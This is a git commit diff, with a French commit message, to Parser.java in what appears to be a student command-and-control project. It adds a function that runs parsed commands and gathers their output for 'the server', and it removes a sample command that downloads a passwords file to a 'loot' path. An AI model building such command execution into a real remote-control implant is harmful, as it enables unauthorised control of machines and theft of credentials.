9af81a08b7579f2436aaf60e5026985d2cf65858
kora <bastien1602f@gmail.com>
2026-03-15 19:30:49 +0100

    finition de la fonction d'execution de commande

--- src/main/java/org/esisar/command_control/Parser.java
+++ src/main/java/org/esisar/command_control/Parser.java
@@ -3,23 +3,23 @@ package org.esisar.command_control;
 import java.io.IOException;
 import java.util.List;
 import java.util.ArrayList;
-import java.util.Objects;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Parser {
-    public static void main(String[] arg) {
+    public static void main(String[] arg) throws IOException {
 
-        String fausseCommande = "download \"C:\\Mes Documents Secrets\\passwords.txt\"   /tmp/loot.txt";
+        String fausseCommande = "whoami";
         System.out.println("On envoie au parseur : " + fausseCommande);
 
         List<String> command = commandSplit(fausseCommande);
         System.out.println("Le parseur a renvoyé : " + command);
+        String resultatC2 = executeCommand(command);
+
+
+        System.out.println("--- CE QUI SERA ENVOYÉ AU SERVEUR ---");
+        System.out.println(resultatC2);
     }
-
-
-
-
 
     public static List<String> commandSplit(String message){
         List<String> result = new ArrayList<>(); //making a list
@@ -36,21 +36,18 @@ public class Parser {
         }
         return result;
     }
-    public static void executeCommand(List<String> command) throws IOException {
+    public static String executeCommand(List<String> command) throws IOException {
         Process execute = new ProcessBuilder(command).start();
-        execute.getInputStream();
-
         java.io.InputStream flux = execute.getInputStream();
         java.io.BufferedReader lecteur = new java.io.BufferedReader(new java.io.InputStreamReader(flux));
 
-
         String line;
-        do {
-            line = lecteur.readLine();
-            System.out.println(line);
-        }
-        while (line != null);
+        StringBuilder responses = new StringBuilder();
+        while ((line = lecteur.readLine()) != null) {
+            responses.append(line).append("\n");
 
+        }
+        return responses.toString();
 
     }
 
